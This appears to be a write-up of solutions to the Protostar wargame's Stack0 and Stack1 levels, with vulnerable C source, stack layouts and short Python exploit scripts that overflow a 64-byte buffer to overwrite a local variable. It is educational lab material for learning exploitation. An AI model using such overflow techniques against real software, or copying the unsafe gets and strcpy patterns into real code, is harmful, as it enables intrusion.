# protostar
protostar sploits and solutions 
https://exploit-exercises.com/protostar

NOTE: write ups in progress. Adding python exploit poc's to each excercise for practice!

##Stack0
---------------------------------------
###Source Code:
```C
int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  modified = 0;
  gets(buffer);

  if(modified != 0) {
      printf("you have changed the 'modified' variable\n");
  } else {
      printf("Try again?\n");
  }
}
```
###Stack:

| eip | ebp | modified(0) |   buffer    |

###The plan:
fill buffer with gets 
since buffer = 64 bytes, an input of 65 bytes should overflow and overwrite modified

###winning command:
```bash
python -c "print 'a'*64+'1'" | ./stack0
```
###Python exploit:
```Python
from subprocess import Popen, PIPE
################
buffer = 64 
fill = "A"*buffer  
input=fill+"1"      
#################
cproc = Popen("./stack0", stdin=PIPE, stdout=PIPE)
print cproc.communicate(input)[0]   
```
        
        
        
        
        

##Stack1
---------------------------------------
###Source Code:
```C
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) {
      errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {
      printf("you have correctly got the variable to the right value\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
}
```
###Stack:
| eip | ebp | modified(0) |   buffer    |

###Plan:
This challenge is similar to the last one with a few differences.  It takes command line args instead of gets, and instead of setting modified to 1, we need to set it to 0x61626364 ("abcd" in ascii). Like the previous challenge, we just fill up buffer and overflow the correct value into modified. Since it's little endian, we need to craft our input so that the value sits in memory correctly. 

###winning command:
```bash
./stack1 $(python -c "print 'a'*64+'dcba'")
```
###Python exploit:
```Python
from subprocess import Popen, PIPE
################
buffer = 64
fill = "A"*buffer
input=fill+'\x64\x63\x62\x61'
#################
cproc = Popen(["./stack1",input], stdin=PIPE, stdout=PIPE)
print cproc.communicate()[0]
```
